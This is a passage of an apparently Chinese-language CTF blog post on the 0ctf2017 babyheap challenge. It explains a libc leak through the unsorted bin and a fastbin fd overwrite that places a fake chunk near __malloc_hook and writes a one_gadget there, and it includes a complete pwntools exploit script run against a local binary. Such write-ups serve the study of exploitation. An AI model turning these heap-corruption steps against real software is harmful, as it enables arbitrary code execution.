+<p><img src="/pwn-notes/images/notes/image-20261017113215330.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017113215330"></p>
+<p><img src="/pwn-notes/images/notes/image-20261017113229609.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017113229609"></p>
+<p>终于接收到了</p>
+<p>接下来计算Libc基址</p>
+<p><img src="/pwn-notes/images/notes/image-20261017160122329.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017160122329"></p>
+<p>直接就是泄露出来的再减去这个就是</p>
+<p><img src="/pwn-notes/images/notes/image-20261017161110837.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017161110837"></p>
+<p>查看malloc_hook附近的函数，然后在进行伪造，使得能够修改其附近的地址。</p>
+<p>接下来就是修改</p>
+<p><img src="/pwn-notes/images/notes/image-20261017162351962.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017162351962"></p>
+<p><img src="/pwn-notes/images/notes/image-20261017162507225.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017162507225"></p>
+<p>所以weizaochunk的地址就是libc基址再加上0x3c4aed.</p>
+<p>然后就是fastbin中修改chunk，之后的话再去更改其fd指针，之后再次申请就可以获得这个fake_chunk,之后再写入就可以。</p>
+<p>因为是7a</p>
+<p>所以申请的大小应该是0x60,</p>
+<p><img src="/pwn-notes/images/notes/image-20261017165018457.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017165018457"></p>
+<p>真的在第四个，一开始还不知道为什么又删除的是第四个</p>
+<p><img src="/pwn-notes/images/notes/image-20261017165222038.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017165222038"></p>
+<p>即是修改其fd指针</p>
+<p>因为2号和4号都是</p>
+<p>所以直接通过修改2号来进行fd修改</p>
+<p><img src="/pwn-notes/images/notes/image-20261017171305470.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017171305470"></p>
+<p>liubc居然弄错了，0a20空格和换行</p>
+<p><img src="/pwn-notes/images/notes/image-20261017172724693.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017172724693"></p>
+<p><img src="/pwn-notes/images/notes/image-20261017172815607.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017172815607"></p>
+<p>也是成功指过去了</p>
+<p>在原来的堆块里面找了半天，地址就不在那里面还找，其实可以写入一些数据，看看是否能写入那个函数附近</p>
+<p><img src="/pwn-notes/images/notes/image-20261017175018550.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017175018550"></p>
+<p>好呀，也是成功的把aaaa写进去了</p>
+<p>那么接下来算到malloc_hook的偏移</p>
+<p>0x7ff4678e3b10 malloc_hook函数地址</p>
+<p>0x7ff4678e3afd  写入地址</p>
+<p>相差0x13</p>
+<p><img src="/pwn-notes/images/notes/image-20261017180053556.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017180053556"></p>
+<p>改完了，接下来只需要申请一下调用这个函数就可以</p>
+<p>这个和wp中的不一样，用的本地的</p>
+<p><img src="/pwn-notes/images/notes/image-20261017181703060.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017181703060"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(r)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-built_in">str</span>(idx))<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-built_in">str</span>(size))<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>  r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>    r.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pay),pay)<br><br>pay1=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(pay1),pay1)<br><br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br><br>pay2=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(pay2),pay2)<br><br>delete(<span class="hljs-number">4</span>)<br><br>dump(<span class="hljs-number">2</span>)<br>r.recvuntil(<span class="hljs-string">b&#x27;Content: \n&#x27;</span>)<br>addr=(r.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(u64(addr))<br>libase=u64(addr)-<span class="hljs-number">0x3c4b78</span><br><span class="hljs-built_in">print</span>(libase)<br><span class="hljs-comment">#pause()</span><br><br>fake_chunk=libase+<span class="hljs-number">0x3c4aed</span><br>add(<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(p64(fake_chunk)),p64(fake_chunk))<br><br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br><br>pay3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libase+<span class="hljs-number">0x4527a</span>)<br><span class="hljs-comment">#pay3=p8(0)*3+p64(0)*2+p64(libase+0x4526a)</span><br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(pay3),pay3)<br><br>add(<span class="hljs-number">0x50</span>)<br><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="/pwn-notes/images/notes/image-20261017181610483.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261017181610483"></p>
+<p><strong>gyctf_2020_force</strong></p>
+<p><img src="/pwn-notes/images/notes/image-20261025153237158.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261025153237158"></p>
+<p><img src="/pwn-notes/images/notes/image-20261025153511815.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261025153511815"></p>
+<p>简单的增加一个堆块，但是size并没有限制，然后增加内容。并且展示新增加的堆块的地址</p>
+<p>好吧其实是有限制的，只能读入50字节。</p>
+<!-- sync-hash: a73a51f93e41571aa7f7b576043f2372f1db9dbb80f8c9b5951c953535185638 -->
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="category-chain-item">题目复现</a>
+  
+  
+    <span>></span>
+    
+  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/0CTF/" class="category-chain-item">0CTF</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/pwn-notes/tags/unsorted-bin/" class="print-no-link">#unsorted-bin</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0ctf2017babyheap</div>
+      <div>https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-0ctf2017babyheap-9d78ba/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>henan808</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/pwn-notes/2026/11/13/sync-typora-rop-1-rop-64-libc-6c7ee7/" title="1.rop（64位泄露libc和）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">1.rop（64位泄露libc和）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-8350d48a-e9e857/" title="单身杯">
+                        <span class="hidden-mobile">单身杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/pwn-notes/js/events.js" ></script>
+<script  src="/pwn-notes/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/pwn-notes/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/pwn-notes/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/pwn-notes/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
